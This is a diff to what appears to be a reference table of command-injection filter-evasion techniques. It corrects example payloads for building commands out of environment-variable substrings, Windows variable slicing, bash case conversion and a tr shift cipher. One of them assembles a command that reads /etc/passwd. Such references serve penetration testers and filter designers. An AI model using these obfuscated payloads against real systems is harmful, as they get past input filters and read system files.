@@ -213,7 +213,7 @@ Entire commands can be assembled from fragments of multiple environment variable
 
 | Subtype | Platform | Mechanism | Example |
 |---|---|---|---|
-| **Distributed assembly (Linux)** | Linux | Concatenate substrings: `${PATH:5:1}${HOME:3:1}...` to spell command names | `a]=${PATH:0:1};${a]}{b}{i}{n}${a]}{c}{a}{t} ${a]}{e}{t}{c}${a]}{p}{a}{s}{s}{w}{d}` |
+| **Distributed assembly (Linux)** | Linux | Concatenate substrings: `${PATH:5:1}${HOME:3:1}...` to spell command names | `s=${PATH:0:1};${s}bin${s}cat ${s}etc${s}passwd` (uses first char of PATH `/`) |
 | **Distributed assembly (Windows)** | Windows | Concatenate `%VAR:~x,y%` fragments across multiple env vars | `%PROGRAMFILES:~3,1%%SYSTEMROOT:~4,2%%PROGRAMFILES:~6,1%` → `gri` |
 
 ### §5-4. PATH Hijacking & LD_PRELOAD Injection
@@ -275,8 +275,8 @@ Inserting quotes within command names does not alter execution but breaks signat
 | Subtype | Platform | Mechanism | Example |
 |---|---|---|---|
 | **Windows case insensitivity** | Windows | CMD and PowerShell ignore case: `WhOaMi`, `WHOAMI` all execute | `wHoAmI` |
-| **Bash case conversion** | Linux | `${var^^}` (uppercase) and `${var,,}` (lowercase) can transform obfuscated variable values to command names | `a]="WHOAMI";${a],,}` |
-| **tr/sed transformation** | Linux | Pipe character transformations: `echo "jdunfhj" \| tr 'a-z' 'b-a'` → shift cipher | `echo "b\x61t" \| tr 'b' 'c'` → `cat` |
+| **Bash case conversion** | Linux | `${var^^}` (uppercase) and `${var,,}` (lowercase) can transform obfuscated variable values to command names | `a="WHOAMI";${a,,}` |
+| **tr/sed transformation** | Linux | Pipe character transformations via `tr` shift cipher — map one character set to another to reconstruct command names from obfuscated strings | `echo "dbu" \| tr 'b-z' 'a-y'` → `cat` (each char shifted back by 1) |
 
 ### §6-6. String Concatenation & Reassembly
 
